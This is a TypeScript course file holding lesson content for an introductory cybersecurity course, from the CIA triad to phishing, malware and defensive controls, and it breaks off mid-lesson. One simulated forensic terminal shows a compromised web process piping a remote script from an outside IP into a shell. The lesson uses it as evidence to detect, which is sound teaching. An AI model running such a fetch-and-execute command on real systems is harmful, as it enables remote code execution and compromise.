/**
 * Cybersecurity Fundamentals — full lesson content.
 *
 * The original version of this course averaged 3.4 blocks per lesson: a
 * paragraph, a callout, a question. That reads as a summary of a lesson rather
 * than the lesson itself. Rewritten here to the same standard as the rest of
 * the catalogue — each lesson opens with why the topic matters, works a
 * concrete example, and closes on a check that tests reasoning.
 *
 * Titles must match scripts/seed-academy/course-1-fundamentals.ts exactly, or
 * the content seeder attaches prose to the wrong lesson.
 */

import {
  type Course, lesson, text, code, callout, check,
  terminal, cmd, out, note, walkthrough, step, diagram, stage, practice,
} from "./blocks";

export const CYBER_FUNDAMENTALS: Course = {
  slug: "cybersecurity-fundamentals",
  modules: [
    {
      title: "What is Cybersecurity?",
      description: "The mental model behind everything you'll learn.",
      lessons: [
        lesson(
          "Why Cybersecurity Matters",
          "Why defending is structurally harder than attacking, and what that means for how you spend effort.",
          6,
          [
            text(
              "Cybersecurity is the practice of protecting systems, networks and data from attacks that aim to steal, alter or deny access to them. That definition is easy to state and slightly misleading, because it makes the job sound like a wall you build once.\n\nIt is closer to a running argument. Someone is trying to find a way in, the ways in change every time software is updated, and the defender has to keep the whole surface covered while the attacker only has to find one gap.",
            ),
            text(
              "That asymmetry is the single most useful thing to understand early. **An attacker needs one way in. A defender must cover every way in.**\n\nIt explains why security work never feels finished, why 'we passed the audit' is not the same as 'we are secure', and why experienced defenders spend their time reducing the number of ways in rather than trying to predict which one will be used.",
            ),
            callout(
              "important",
              "There is no perfectly secure system",
              "The goal is not to make attacks impossible. It is to make them expensive — expensive enough that the attacker gives up, gets noticed, or moves to a softer target. Every control you will learn is a way of raising that cost.",
            ),
            text(
              "This reframes what a 'good' security decision looks like. A control that blocks one clever attack but costs the business a fortune is usually worse than a dull control that removes an entire category of attack cheaply.\n\nMultifactor authentication is the standard example. It is unglamorous, it stops almost every credential-stuffing and password-spraying attack outright, and it costs very little. Most of the highest-value work in this field looks like that.",
            ),
            check(
              "A company blocks a specific piece of malware by its file hash. Why is this a weak control on its own?",
              [
                "Hashes are expensive to compute at scale",
                "Recompiling the malware changes the hash, so the attacker bypasses it for almost no effort",
                "Antivirus products do not support hash blocking",
                "It only works on Windows systems",
              ],
              1,
              "The control raises the attacker's cost by almost nothing — a single recompile defeats it. Good controls remove a category of attack rather than one instance of it, which is why behavioural detection outlasts hash blocking.",
            ),
          ],
        ),
        lesson(
          "The CIA Triad",
          "Confidentiality, integrity and availability — and why they pull against each other in practice.",
          8,
          [
            text(
              "Almost every security control exists to protect one of three properties, known together as the **CIA triad**.\n\n**Confidentiality** — only authorised people can read the data. **Integrity** — the data cannot be altered without that alteration being detectable. **Availability** — the system and its data are there when they are needed.",
            ),
            text(
              "The reason this is worth memorising is not the definitions. It is that naming which property is at stake tells you which controls are relevant.\n\nEncryption protects confidentiality and does nothing for availability. Backups protect availability and integrity and do nothing for confidentiality — in fact an unencrypted backup is a confidentiality risk of its own. Digital signatures protect integrity and leave the data perfectly readable.",
            ),
            code(
              `Property          Protected by                     Does NOT protect
────────────      ─────────────────────────────    ────────────────────
Confidentiality   Encryption, access control       Data being deleted
Integrity         Hashing, signatures, audit logs  Data being read
Availability      Backups, redundancy, DDoS        Data being copied`,
              "text",
              "Each control buys one property. Confusing them is how gaps appear.",
            ),
            text(
              "The three also trade against each other, which is where real judgement comes in. A system disconnected from every network and locked in a safe has excellent confidentiality and no availability at all. A database replicated to twelve regions has excellent availability and twelve times the confidentiality exposure.\n\nGood security is not maximising all three. It is deciding which matters most for this specific data and accepting the cost on the others deliberately rather than by accident.",
            ),
            check(
              "Ransomware encrypts a hospital's patient records. Staff cannot open them, but the attacker never reads them. Which property is primarily violated?",
              [
                "Confidentiality, because the data was encrypted by someone else",
                "Integrity, because the files were modified",
                "Availability, because the data exists but cannot be reached when needed",
                "None — encryption is a security control",
              ],
              2,
              "The records still exist and were never read, so confidentiality is intact. They were not meaningfully altered in content. What was destroyed is access at the moment it was needed, which is availability — and in a hospital that is the property with lives attached to it.",
            ),
          ],
        ),
        lesson(
          "Threats, Vulnerabilities & Risk",
          "Three words used interchangeably in conversation that mean different things and drive different decisions.",
          7,
          [
            text(
              "These three get used as synonyms constantly, and the confusion has practical consequences: teams patch things that do not matter and ignore things that do.\n\nA **threat** is something that could cause harm — a ransomware crew, a careless employee, a flood. A **vulnerability** is a weakness that a threat could use — an unpatched server, a shared password, a building on a floodplain. **Risk** is what you get when a threat can actually reach a vulnerability, weighted by how bad the outcome would be.",
            ),
            text(
              "The reason this matters is that risk is the only one of the three you can act on sensibly. You cannot remove threats — ransomware crews exist whether you like it or not. You cannot remove every vulnerability, because there are always more than you have time for.\n\nWhat you can do is break the connection between them, and that is what most security work actually is.",
            ),
            code(
              `Vulnerability                    Threat can reach it?   Real risk?
──────────────────────────────   ────────────────────   ──────────
Unpatched web server, internet   Yes, trivially         HIGH
Unpatched print server, no net   No route in            LOW
Weak password, no MFA, VPN       Yes, sprayed daily     HIGH
Weak password, air-gapped lab    Physical access only   LOW`,
              "text",
              "Identical vulnerabilities, very different risk. Reachability is what separates them.",
            ),
            callout(
              "warning",
              "A severity score is not a risk score",
              "CVSS tells you how bad a vulnerability is in the abstract, on someone else's network. It knows nothing about whether the affected system is exposed, what data it holds, or whether a compensating control already blocks the path. Treating the score as the priority is how teams end up patching a 9.8 on an isolated test box while a 6.5 sits on the internet.",
            ),
            check(
              "Two servers have the same critical vulnerability. One is internet-facing; one is on an isolated network with no route in. What is the correct conclusion?",
              [
                "Both carry the same risk, because the vulnerability is identical",
                "The isolated one is higher risk because it is monitored less",
                "The internet-facing one carries far higher risk, because a threat can actually reach the weakness",
                "Neither carries risk until an exploit is published",
              ],
              2,
              "Risk needs all three parts: a threat, a vulnerability, and a path between them. The vulnerability is identical, but only one is reachable — and reachability is usually the fastest lever you have, because segmenting a system is often quicker than patching it.",
            ),
          ],
        ),
      ],
    },
    {
      title: "The Threat Landscape",
      description: "Who attacks, why, and how.",
      lessons: [
        lesson(
          "Threat Actors",
          "Who is actually attacking you, what they want, and why motivation predicts behaviour better than skill does.",
          7,
          [
            text(
              "'Hacker' is not a useful category. The people trying to get into systems differ enormously in what they want, how much they will spend, and how much they care about being caught — and those differences predict what they will do far better than raw technical skill does.\n\nKnowing which kind of actor you are dealing with changes your response. An opportunist who finds the door locked leaves. A targeted intruder who finds the door locked looks for a window.",
            ),
            code(
              `Actor                 Wants                  Patience    Gives up when
───────────────────   ────────────────────   ─────────   ─────────────────
Opportunistic crime   Fast money             Very low    Anything is hard
Ransomware crew       Payment                Medium      Backups are clean
Insider               Varies — money, spite  High        Rarely detected
Hacktivist            Attention              Low         Story goes cold
State-sponsored       Information, access    Very high   Almost never`,
              "text",
              "Motivation and patience matter more than skill for predicting behaviour.",
            ),
            text(
              "Two of these deserve special attention because they break the usual assumptions.\n\n**Insiders** already have credentials, already know where the valuable data is, and generate activity that looks legitimate because in most respects it is. Perimeter controls are irrelevant to them. **State-sponsored actors** are defined by patience rather than sophistication — they will spend months on access they do not use yet, which is precisely what makes them hard to find.",
            ),
            callout(
              "info",
              "Most attacks are not targeted at you",
              "The overwhelming majority of what reaches an average organisation is automated and indiscriminate — scanners sweeping the internet for a known flaw, credential stuffing against every login page. This is good news, because generic defences work well against generic attacks. It becomes bad news the moment someone chooses you specifically.",
            ),
            check(
              "An intruder has had access for eight months, taken nothing obviously valuable, and quietly maintained several ways back in. Which actor profile does this fit?",
              [
                "Opportunistic criminal, waiting for a buyer",
                "Ransomware crew preparing to encrypt",
                "State-sponsored actor, where long-term access is itself the objective",
                "Hacktivist gathering material for a leak",
              ],
              2,
              "Every other profile monetises or publicises quickly, because time increases their risk of being caught for no gain. Access held for months without being used is characteristic of an actor for whom the access itself is the prize.",
            ),
          ],
        ),
        lesson(
          "The Attack Lifecycle",
          "How a breach actually unfolds, and why the middle stages are where defence pays off most.",
          8,
          [
            text(
              "Breaches are almost never a single event. They are a sequence, and each stage depends on the one before it — which is genuinely good news, because it means you get more than one chance to stop it.\n\nThe stages below are simplified from frameworks like the Cyber Kill Chain and MITRE ATT&CK. The exact names vary; the shape does not.",
            ),
            diagram(
              "A breach, stage by stage",
              "Each node depends on the one before it. Read each as a question: at this point, what would we have seen, and what would have stopped it?",
              [
                stage("Reconnaissance", "T1592", "The attacker learns about you — staff names from LinkedIn, technologies from job adverts, exposed services from internet-wide scan data. Almost none of this touches your systems, which is why it is nearly undetectable and why limiting what you publish matters."),
                stage("Initial access", "T1566", "The first foothold, most often a phishing email or an exposed service with a known flaw. This is the most heavily defended stage and still the one that succeeds, because it only has to work once out of hundreds of attempts."),
                stage("Execution and persistence", "T1547", "Code runs, and the attacker arranges to survive a reboot — a scheduled task, a service, a registry key. Persistence is noisy and rarely necessary for the attacker's goal, which makes it one of the best detection opportunities you get."),
                stage("Privilege escalation", "T1068", "The first account is rarely the one they want. They move from user to administrator by exploiting a local flaw or finding credentials left somewhere convenient."),
                stage("Lateral movement", "T1021", "Spreading from the first host toward the systems that hold something worth taking. This stage generates authentication patterns that simply do not occur in normal use, which is why it is so detectable if you are watching."),
                stage("Collection and exfiltration", "T1041", "Data is gathered, usually compressed and encrypted, and sent out. By now the damage is largely done — detection here limits the loss rather than preventing it."),
              ],
            ),
            text(
              "Notice where the opportunities are. Reconnaissance is nearly invisible to you. Exfiltration is too late to be a win. The stages in the middle — persistence, escalation, lateral movement — are where the attacker has to do unusual things on systems you control and can watch.\n\nThat is why mature security teams invest in endpoint and authentication visibility rather than pouring everything into the perimeter. The perimeter gets one chance; the middle gives you four.",
            ),
            check(
              "Why is lateral movement one of the most productive stages to build detection around?",
              [
                "It is the only stage that generates any logs",
                "It requires authentication patterns between systems that do not occur in normal operation",
                "It always uses malware that antivirus will recognise",
                "It happens before the attacker has any access",
              ],
              1,
              "A workstation authenticating to a server it has never contacted before is not something normal business activity produces. The attacker cannot avoid it either — reaching the data requires moving toward it, which is what makes this stage both unavoidable and visible.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Networking Basics",
      description: "How data moves — the foundation for everything.",
      lessons: [
        lesson(
          "IP Addresses & Ports",
          "Addresses identify machines and ports identify services — the two coordinates behind every connection you will investigate.",
          9,
          [
            text(
              "Every connection on a network is described by two things at each end: an **IP address**, which identifies the machine, and a **port**, which identifies the service on it. Together they form a socket, and a conversation is a pair of sockets.\n\nThis sounds basic and it is, but it is also the coordinate system every network investigation runs on. When you read a firewall log or a flow record, this is what you are reading.",
            ),
            code(
              `10.20.4.15:51422  ->  142.250.187.14:443

└──── source ────┘      └──── destination ────┘
     host   ephemeral        host      service
            port                       port (HTTPS)`,
              "text",
              "One connection. The high source port is assigned per-connection and means nothing on its own.",
            ),
            text(
              "Two distinctions carry most of the practical weight.\n\n**Private versus public addresses.** The ranges `10.0.0.0/8`, `172.16.0.0/12` and `192.168.0.0/16` are private — they are not routable on the internet and are reused inside every organisation. Seeing one in a log tells you the traffic is internal. **Well-known versus ephemeral ports.** Ports below 1024 are assigned to standard services; the high-numbered source port is picked per connection and carries no meaning.",
            ),
            code(
              `20/21   FTP          123   NTP         443    HTTPS
22      SSH          135   RPC         445    SMB
23      Telnet       139   NetBIOS     3306   MySQL
25      SMTP         161   SNMP        3389   RDP
53      DNS          389   LDAP        5432   PostgreSQL
80      HTTP         636   LDAPS       6379   Redis`,
              "text",
              "The ports worth knowing by sight. 445 and 3389 appear in most lateral movement.",
            ),
            practice(
              "Given the connection log below, write a one-liner that prints only the connections going to SSH — the port an attacker uses to move between Linux hosts.",
              ["awk", "22"],
              `awk -F'[ :]+' '$4 == 22' conns.log`,
              "Filtering on the destination port is the most common first cut in network triage. The exact tool matters less than knowing that the port number identifies the service, so 22 selects SSH regardless of which host is involved.",
              {
                setup: {
                  label: "conns.log — source:port -> dest:port",
                  code: `10.20.4.15:51422 -> 142.250.187.14:443
10.20.4.15:51890 -> 10.20.9.31:22
10.20.4.88:44120 -> 10.20.9.31:445
10.20.7.14:52001 -> 10.20.9.31:22`,
                },
              },
            ),
            check(
              "A log shows a connection from 10.20.4.15:51422 to 10.20.9.31:445. What does this most likely represent?",
              [
                "A web request, because 51422 is a high port",
                "Internal file sharing or administrative access over SMB",
                "Traffic leaving the organisation to the internet",
                "A DNS lookup",
              ],
              1,
              "Both addresses are in the private 10.0.0.0/8 range, so this is internal. The destination port 445 is SMB. The source port is ephemeral and tells you nothing — reading it as significant is one of the most common beginner mistakes.",
            ),
          ],
        ),
        lesson(
          "The OSI Model & DNS",
          "A layered map of how data moves, and the naming system that starts almost every connection.",
          8,
          [
            text(
              "The OSI model splits networking into seven layers, each responsible for one job and each relying on the one below it. Its practical value is not memorising the list — it is that it tells you which layer a problem lives at, and therefore which tool will answer your question.\n\nIf a name will not resolve, that is layer 7 and no amount of cable-checking will help. If packets are being dropped between two subnets, that is layer 3 and a browser will tell you nothing useful.",
            ),
            code(
              `7  Application    HTTP, DNS, SMB        What the user sees
6  Presentation   TLS, encoding         Encryption, formatting
5  Session        Connection state      Establishing conversations
4  Transport      TCP, UDP, ports       Which service, reliability
3  Network        IP, routing           Which machine, which path
2  Data link      Ethernet, MAC         Which device on this segment
1  Physical       Cables, radio         Actual signals`,
              "text",
              "Layers 3, 4 and 7 carry nearly all security-relevant investigation.",
            ),
            text(
              "**DNS** sits at layer 7 and deserves special attention because almost every connection begins with it. A machine that wants to reach a name must first turn that name into an address, and it asks a resolver to do it.\n\nThat makes resolver logs unusually valuable evidence. They record *intent* — what a host wanted to reach — even when the connection that followed was encrypted, blocked, or failed entirely. A host that looked up a known-malicious domain has told you something even if it never connected.",
            ),
            terminal(
              "Following a name to an address",
              "student@lab",
              [
                note("Start with what the name resolves to. This is the lookup every connection makes before it can begin."),
                cmd("dig +short cybersagevault.uk"),
                out(`76.76.21.21`),
                note("Now ask for the full answer, including which record types exist. The record type tells you what the name is used for."),
                cmd("dig cybersagevault.uk ANY +noall +answer"),
                out(`cybersagevault.uk.   300  IN  A      76.76.21.21
cybersagevault.uk.   300  IN  MX     10 mx.improvmx.com.
cybersagevault.uk.   300  IN  TXT    "v=spf1 include:spf.improvmx.com ~all"`),
                note("An MX record means mail is handled elsewhere. The SPF record in TXT says which servers may send mail as this domain — that one is a security control."),
                cmd("dig +short suspicious-domain-example.test"),
                out(`;; connection timed out; no servers could be reached`),
                note("A name that does not resolve is still evidence. The host asked for it, and the asking is recorded whether or not an answer came back."),
              ],
            ),
            check(
              "Why are DNS resolver logs valuable even when all the traffic that follows is encrypted?",
              [
                "They contain the decrypted contents of the session",
                "They record which name the host wanted to reach, before the encrypted connection begins",
                "Encryption does not apply to any traffic on port 53",
                "They store the certificate presented by the server",
              ],
              1,
              "The lookup happens before the session is established and is not itself part of the encrypted conversation. That records intent — the host asked for a specific name — which survives even when the payload that follows is completely opaque.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Operating System Essentials",
      description: "Windows and Linux from a security lens.",
      lessons: [
        lesson(
          "Users, Permissions & Privilege",
          "Identity, what it is allowed to do, and why almost every serious intrusion involves gaining more of it.",
          8,
          [
            text(
              "Every action on an operating system happens as some identity, and every identity has a set of things it is permitted to do. That pairing — who you are, and what that lets you touch — is the foundation both operating systems build their security on.\n\nAn intrusion is very often a story about privilege: an attacker arrives as an ordinary user and needs to become an administrator, because the ordinary user cannot reach what they came for.",
            ),
            code(
              `Concept              Linux                    Windows
──────────────────   ──────────────────────   ───────────────────────
Superuser            root (uid 0)             SYSTEM / Administrator
Temporary elevation  sudo                     UAC / Run as administrator
Group membership     groups, /etc/group       Security groups, AD
Service identity     dedicated service user   Service account, gMSA
Credential store     /etc/shadow (hashes)     SAM, LSASS in memory`,
              "text",
              "Different vocabulary, identical concepts.",
            ),
            text(
              "The single most important principle here is **least privilege**: an account should have exactly the permissions its job needs and nothing more.\n\nIt is widely agreed with and widely ignored, because over-permissioning is the path of least resistance. Granting administrator rights makes the immediate problem go away; working out the four permissions actually required takes an afternoon. The cost of that shortcut only arrives later, when the account is compromised and the attacker inherits everything it was given.",
            ),
            callout(
              "danger",
              "Service accounts are the usual weak point",
              "They tend to be over-permissioned because nobody wants to debug a broken service, they often have passwords that never expire, and no human notices when they behave oddly at three in the morning. A service account with domain administrator rights is one of the most common findings in a real assessment.",
            ),
            check(
              "An application needs to read one database table. The team grants it full database administrator rights because it is quicker. What is the actual cost of that decision?",
              [
                "There is none, provided the application itself is written securely",
                "If the application is ever compromised, the attacker inherits full control of the database rather than read access to one table",
                "The database will run measurably slower",
                "Backups will no longer be consistent",
              ],
              1,
              "Least privilege is about limiting the consequences of compromise, not about trusting the code. The application's own quality is irrelevant to the question — what matters is how much an attacker gains on the day it is exploited.",
            ),
          ],
        ),
        lesson(
          "Processes, Logs & the Filesystem",
          "Where activity happens and where the record of it lives — the three places you look first on any host.",
          7,
          [
            text(
              "When something happens on a machine, it leaves traces in three places: a **process** that ran, a **log entry** describing it, and changes on the **filesystem**. Nearly all host-based investigation is the work of correlating those three.\n\nEach one alone is weak. A process list shows what is running now but not what ran an hour ago. Logs show what was recorded, which is not the same as what happened. Files show the end state without saying how it was reached.",
            ),
            terminal(
              "The three places, on a Linux host",
              "analyst@web-01",
              [
                note("First: what is running right now, and who is it running as? The user column is the first thing to read."),
                cmd("ps -eo user,pid,ppid,etime,cmd --sort=-etime | head -5"),
                out(`USER       PID  PPID  ELAPSED CMD
root         1     0 21-04:11 /sbin/init
www-data  1841     1 14-02:33 /usr/sbin/nginx -g daemon off;
root      2209     1  6-18:02 /usr/sbin/sshd -D
www-data 31882  1841     4:19 /bin/sh -c curl http://185.244.25.171/a.sh | sh`),
                note("The last line is wrong in two ways: a web server process spawned a shell, and that shell is piping a download straight into an interpreter."),
                cmd("ls -la /proc/31882/cwd /proc/31882/exe"),
                out(`lrwxrwxrwx 1 www-data www-data 0 Aug  6 02:14 /proc/31882/cwd -> /tmp
lrwxrwxrwx 1 www-data www-data 0 Aug  6 02:14 /proc/31882/exe -> /bin/dash`),
                note("Second: the logs. Authentication and system events are the highest-value place to look."),
                cmd("grep -iE 'accepted|failed|session opened' /var/log/auth.log | tail -3"),
                out(`Aug  6 02:09:51 web-01 sshd[31702]: Failed password for invalid user admin from 185.244.25.171
Aug  6 02:10:44 web-01 sshd[31711]: Failed password for invalid user test from 185.244.25.171
Aug  6 02:13:02 web-01 sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash`),
                note("Third: the filesystem. Recently changed files in writable directories are where dropped tooling tends to land."),
                cmd("find /tmp /var/tmp -type f -mmin -30 -ls 2>/dev/null"),
                out(`  262145   4 -rwxr-xr-x   1 www-data www-data     1841 Aug  6 02:14 /tmp/.a.sh`),
                note("A process, an auth log entry and a dropped file, all inside five minutes. No one of them would have been conclusive; together they are a clear sequence."),
              ],
            ),
            text(
              "The lesson from that sequence is that **correlation is what produces confidence**. The shell spawning from nginx could conceivably be a deployment script. The sudo entry could be a legitimate administrator. The file in `/tmp` could be anything.\n\nWhat cannot be explained away is the three of them occurring in order, minutes apart, from an address that had just been failing SSH logins.",
            ),
            check(
              "Why is a process list alone a weak basis for concluding a host is clean?",
              [
                "Process lists cannot show the user an process runs as",
                "It shows only what is running at this moment, so anything that ran and exited leaves no trace in it",
                "Process names are always forged by attackers",
                "It requires administrator rights, which analysts rarely have",
              ],
              1,
              "A process list is a snapshot. Malware that ran, did its work and exited is completely absent from it — which is why execution artefacts and logs, which persist after the process is gone, matter as much as the live view.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Core Security Principles",
      description: "Timeless ideas that guide good defence.",
      lessons: [
        lesson(
          "Defence in Depth & Zero Trust",
          "Why layering controls beats perfecting one, and what replaced the idea of a trusted internal network.",
          7,
          [
            text(
              "**Defence in depth** is the practice of layering independent controls so that no single failure is enough. It exists because every control fails sometimes — a patch is missed, a rule is misconfigured, a user clicks the thing.\n\nThe point is not that any layer is excellent. It is that the layers fail independently, so an attacker has to defeat several unrelated things in sequence.",
            ),
            code(
              `An attacker's path, and what stands in the way

  Phishing email      →  mail filtering, attachment sandboxing
  User opens it       →  awareness training, macro policy
  Payload executes    →  endpoint detection, application control
  Calls home          →  egress filtering, DNS monitoring
  Escalates           →  least privilege, credential hygiene
  Moves laterally     →  segmentation, MFA on internal services
  Takes data          →  DLP, volume alerting`,
              "text",
              "Seven chances. Any one of them holding ends the intrusion.",
            ),
            text(
              "**Zero trust** is what replaced the older model in which the internal network was treated as safe. That model made sense when everyone worked in one building; it stopped making sense the moment there were laptops, cloud services and contractors.\n\nThe principle is 'never trust, always verify': being inside the network grants nothing. Every request is authenticated and authorised on its own merits, regardless of where it came from.",
            ),
            callout(
              "important",
              "Location is not identity",
              "The failure the old model produced was consistent — an attacker who got any foothold inside then moved freely, because internal systems trusted internal callers. Zero trust removes that reward, so the first foothold buys far less than it used to.",
            ),
            check(
              "An organisation invests heavily in a next-generation firewall and treats everything inside it as trusted. What is the structural flaw?",
              [
                "Firewalls cannot inspect encrypted traffic at all",
                "A single successful phishing email puts the attacker inside the trusted zone, where nothing further challenges them",
                "Next-generation firewalls are less effective than traditional ones",
                "The internal network will be too slow",
              ],
              1,
              "The whole defence rests on one control holding. Phishing bypasses the perimeter entirely by arriving as legitimate traffic to a user who opens it — and once inside, the trust model actively helps the attacker.",
            ),
          ],
        ),
        lesson(
          "Authentication, Authorisation & MFA",
          "Proving who you are, deciding what you may do, and the single control that stops most credential attacks.",
          8,
          [
            text(
              "**Authentication** answers 'who are you'. **Authorisation** answers 'what are you allowed to do'. They are separate steps and are frequently confused, which produces a specific and dangerous bug: systems that authenticate carefully and then authorise barely at all.\n\nIf a web application checks your login and then serves any record whose id you type into the URL, it authenticated you perfectly and authorised you not at all.",
            ),
            text(
              "Authentication rests on factors — categories of evidence, and the categories matter more than the count.\n\n**Something you know** (a password), **something you have** (a phone, a hardware key), **something you are** (a fingerprint, a face). Two passwords are not two factors, because both fail to the same attack. A password plus a hardware key are, because stealing the password does not get you the key.",
            ),
            code(
              `Method                     Stops password reuse?   Stops phishing?
────────────────────────   ─────────────────────   ───────────────
Password only              No                      No
Password + SMS code        Yes                     No — relayable
Password + app code (TOTP) Yes                     No — relayable
Password + push approval   Yes                     Weak — fatigue
Passkey / FIDO2 hardware   Yes                     Yes — origin-bound`,
              "text",
              "All MFA stops credential stuffing. Only origin-bound factors stop real-time phishing.",
            ),
            text(
              "That last row is the one worth understanding. Phishing kits now relay in real time: the victim enters their code on a fake page, the kit immediately submits it to the real site, and the six digits work exactly once, for the attacker.\n\nFIDO2 and passkeys defeat this because the credential is cryptographically bound to the real site's origin. Presented with a lookalike domain, the authenticator simply does not produce a signature — there is nothing for the victim to get wrong.",
            ),
            check(
              "A user enters their TOTP code on a convincing fake login page. The attacker relays it to the real site within seconds. Why does this succeed where a passkey would fail?",
              [
                "TOTP codes are transmitted without encryption",
                "The code is valid for any site, so relaying it works; a passkey signature is bound to the real origin and is never produced for the fake one",
                "Passkeys use longer codes that are harder to type",
                "TOTP codes do not expire",
              ],
              1,
              "The six digits carry no information about where they were entered, so they are equally valid wherever they are replayed. A passkey's signature covers the origin, so a lookalike domain gets no usable signature at all — the protection does not depend on the user noticing anything.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Common Attacks",
      description: "The threats you'll see most often.",
      lessons: [
        lesson(
          "Phishing & Social Engineering",
          "Why the most effective attacks target people rather than software, and what actually reduces them.",
          8,
          [
            text(
              "Social engineering is manipulating a person into doing something that harms their own interests. It remains the most reliable route into an organisation, not because people are foolish, but because it targets the traits that make them good at their jobs: helpfulness, deference to authority, and responsiveness under time pressure.\n\n**Phishing** is social engineering delivered at scale, usually by email.",
            ),
            text(
              "The levers are consistent enough to be worth naming, because recognising the lever is more reliable than recognising the pretext.\n\n**Authority** — a message that appears to come from someone senior. **Urgency** — a deadline that discourages checking. **Fear** — a threatened consequence. **Familiarity** — a reference to something real about your organisation. **Reciprocity** — a small favour first, a request second.",
            ),
            walkthrough(
              "Working out whether a message is legitimate",
              "An email arrives from your finance director asking you to process an urgent payment to a new supplier. It uses their name, mentions a real project, and asks you to keep it confidential until the deal is announced. Work through what actually settles this.",
              [
                step(
                  "Read the levers before reading the content",
                  "Before checking any technical detail, notice what the message is doing to you. It claims authority, imposes urgency, and asks for secrecy — and that last one specifically discourages the verification that would expose it.",
                  {
                    insight: "Confidentiality requests in a payment instruction are close to diagnostic. Legitimate finance processes are designed to be checked, not hidden from colleagues.",
                  },
                ),
                step(
                  "Look at the actual sender address, not the display name",
                  "Display names are free text and can say anything. The address behind them is what the mail was sent from, and mail clients hide it by default — which is exactly why it is worth the two seconds to expand.",
                  {
                    evidence: {
                      label: "Message header",
                      code: `From: Sarah Whitfield <s.whitfield@acme-finance.co>
Reply-To: s.whitfield@acme-finance.co
Return-Path: bounce@mail-relay-04.sendgrid.net

Legitimate internal mail: s.whitfield@acmecorp.com`,
                    },
                    insight: "The domain is acme-finance.co, not acmecorp.com. It is close enough to survive a glance, which is the entire design.",
                  },
                ),
                step(
                  "Check whether the domain is old enough to be real",
                  "Lookalike domains are registered for a campaign and used within days. A registration date measured in weeks, for a company that has existed for decades, is very hard to explain innocently.",
                  {
                    evidence: {
                      label: "Domain registration",
                      code: `Domain:        acme-finance.co
Created:       2026-07-29  (8 days ago)
Registrar:     privacy-protected
Nameservers:   ns1.cheap-dns.example`,
                    },
                    insight: "Eight days old, privacy-protected. Nothing about this is consistent with a company's real finance domain.",
                  },
                ),
                step(
                  "Verify through a channel the sender did not choose",
                  "This is the step that settles it, and the only one that works even when every technical indicator is clean. Call the finance director on the number in your internal directory — not one supplied in the email.",
                  {
                    evidence: {
                      label: "The two ways to reach 'Sarah'",
                      code: `In the email:      reply, or call 020-7946-0—— (in the signature)
Internal directory: s.whitfield@acmecorp.com, ext. 4021

The real Sarah, on ext. 4021: "I didn't send that."`,
                    },
                    insight: "An attacker controls every channel they provide. Using a number or address you already had removes that control entirely, which is why out-of-band verification is the one habit worth enforcing as policy.",
                  },
                ),
                step(
                  "Report it, even though you did not fall for it",
                  "The message went to more people than you. Reporting is what lets the security team pull it from other mailboxes and block the domain before someone under more time pressure reads it.",
                  {
                    insight: "The value of a report is proportional to how fast it arrives. A user who spots the message in minute one and says nothing has protected only themselves.",
                  },
                ),
              ],
            ),
            callout(
              "tip",
              "Blame the process, not the person",
              "If clicking one link can cost the company money, the failure is the process, not the employee. Organisations that punish reporting get fewer reports, not fewer incidents — and the incidents they do get are found much later.",
            ),
            check(
              "Which single change most reduces the impact of business email compromise?",
              [
                "More frequent phishing awareness training",
                "A mandatory out-of-band verification step for any change to payment details",
                "Blocking all email attachments",
                "Requiring longer passwords",
              ],
              1,
              "Training reduces click rates but never to zero, and BEC messages often carry no link or attachment at all. A verification step in the payment process removes the payoff regardless of whether anyone was fooled, which is why it survives the day someone is having a bad week.",
            ),
          ],
        ),
        lesson(
          "Malware & Ransomware",
          "The main families of malicious software, and why modern ransomware changed what backups protect you from.",
          7,
          [
            text(
              "Malware is a broad label for software written to act against the interests of the system it runs on. The categories overlap heavily in practice — most real samples do several of these things — but the vocabulary is worth having because it describes intent.",
            ),
            code(
              `Type          What it does                        Primary goal
───────────   ─────────────────────────────────   ──────────────────
Virus         Attaches to files, spreads on use   Propagation
Worm          Spreads by itself across a network  Propagation
Trojan        Looks legitimate, is not            Initial access
RAT           Gives remote interactive control    Persistent access
Rootkit       Hides other activity from the OS    Evading detection
Infostealer   Harvests credentials and cookies    Credential theft
Ransomware    Encrypts data, demands payment      Extortion
Wiper         Destroys data, no recovery offered  Disruption`,
              "text",
              "Most real samples combine several. The category describes intent, not code.",
            ),
            text(
              "**Ransomware** deserves separate treatment because it changed shape in a way that broke the standard advice.\n\nThe old model encrypted your files and sold you the key, so good backups were a complete answer. The current model steals the data *first*, then encrypts — so refusing to pay means restoring from backup and still having your data published. That is 'double extortion', and backups do nothing about the second half of it.",
            ),
            callout(
              "warning",
              "Backups you have never restored are a hypothesis",
              "The failure mode is depressingly consistent: backups ran successfully for two years, and the restore fails because the retention window was too short, the backup server shared credentials with production and was encrypted too, or nobody had ever timed a full restore. An untested backup is a belief, not a control.",
            ),
            check(
              "A company with excellent, tested, offline backups is hit by modern ransomware. Why might they still face serious harm?",
              [
                "Offline backups cannot be restored without the attacker's key",
                "The attacker stole the data before encrypting it, so refusing to pay still means publication",
                "Backups always contain the ransomware itself",
                "Encryption is irreversible even with backups",
              ],
              1,
              "Backups answer the availability half of the attack completely. They have no bearing on the confidentiality half — the data was already copied out before anything was encrypted, and that copy is what the second demand is about.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Defence Basics",
      description: "The tools and habits that keep systems safe.",
      lessons: [
        lesson(
          "Firewalls, Antivirus & Patching",
          "The three controls every organisation has, what each genuinely covers, and the gaps between them.",
          7,
          [
            text(
              "These three are the baseline in effectively every organisation. They are also routinely over-trusted, because each one covers a narrower slice than its reputation suggests. Knowing the edges of each is more useful than knowing how to configure them.",
            ),
            text(
              "**Firewalls** decide which connections are permitted, based on address, port and increasingly on application. The gap: most are configured tightly inbound and loosely outbound, so an implant that calls out to port 443 leaves unchallenged. Egress filtering is the neglected half, and it is the half that catches command-and-control.\n\n**Antivirus and EDR** inspect what runs. Signature matching catches known samples; behavioural detection catches patterns like a document spawning a script interpreter. The gap: signatures fail on anything recompiled, which costs an attacker minutes.\n\n**Patching** removes known vulnerabilities. The gap is entirely operational — the fix usually exists long before it is applied.",
            ),
            code(
              `Control     Strong against                  Blind to
─────────   ─────────────────────────────   ──────────────────────────
Firewall    Unsolicited inbound, scanning   Outbound over 443, insiders
Antivirus   Known malware, common tooling   Recompiled or novel samples
EDR         Behaviour: injection, spawning  Anything indistinguishable
            unusual child processes         from normal admin activity
